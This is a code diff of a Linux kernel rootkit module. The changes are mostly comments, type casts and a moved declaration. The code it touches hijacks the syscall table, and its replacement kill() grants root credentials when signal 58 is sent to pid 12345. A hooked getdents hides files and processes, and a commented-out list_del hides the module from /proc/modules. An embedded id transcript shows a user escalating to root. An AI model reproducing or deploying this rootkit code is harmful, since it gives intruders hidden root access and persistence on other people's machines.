@@ -7,7 +7,7 @@
 #include <asm/current.h>
 #include <linux/sched.h>
 #include <linux/syscalls.h>
-#include <asm/system.h>
+#include <asm/system.h> //are all these even needed?
 #include <asm/cacheflush.h>
 #include <linux/proc_fs.h>
 #include <linux/dirent.h>
@@ -46,7 +46,6 @@ address **find(void) { //finds syscall table
     return NULL;
 }
     
-asmlinkage int (*original_kill)(pid_t pid, int sig);
 /*
 [lkm@lkm ~]$ id
 uid=1000(lkm) gid=100(users) groups=100(users)
@@ -55,11 +54,13 @@ uid=1000(lkm) gid=100(users) groups=100(users)
 uid=0(root) gid=0(root) groups=0(root),100(users)
 */
 
+asmlinkage int (*original_kill)(pid_t pid, int sig);
+
 asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 58
     if ((pid == 12345) && (sig == 58)) {      //and pid 12345 then give parent root privs
         struct task_struct *ptr = current;
         struct cred *cred;
-        cred=__task_cred(ptr); //parent task creds
+        cred=(struct cred *)__task_cred(ptr); //task creds
         cred->uid = 0; //user id
         cred->gid = 0x31337; //group id //not 0 to allow hiding processes
         cred->suid = 0; //saved uid
@@ -90,10 +91,10 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 
 asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     struct linux_dirent {
-        ino_t          d_ino;
-        off_t          d_off;
-        unsigned short d_reclen;
-        char           d_name[];
+        ino_t          d_ino; //inode
+        off_t          d_off; //offset
+        unsigned short d_reclen; //record length
+        char           d_name[]; //filename
     };
     char buf[count];
     int bpos,nread;
@@ -118,10 +119,10 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
 }
 
 static int init(void) { //initial function, sets up syscall hijacking
-    struct module *myself = &__this_module;
-	syscall_table = find(); //give us the syscall table address for modification
+    //struct module *myself = &__this_module; //hide gcc warning
+    //list_del(&myself->list); //remove from places such as /proc/modules
+	syscall_table = (address *)find(); //give us the syscall table (defined above find())
     if (!syscall_table) {cleanup_module(); } //if find() fails, unload
-//    list_del(&myself->list); //remove from places such as lsmod
     //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
     //original_getdents = (void *)syscall_table[__NR_getdents];
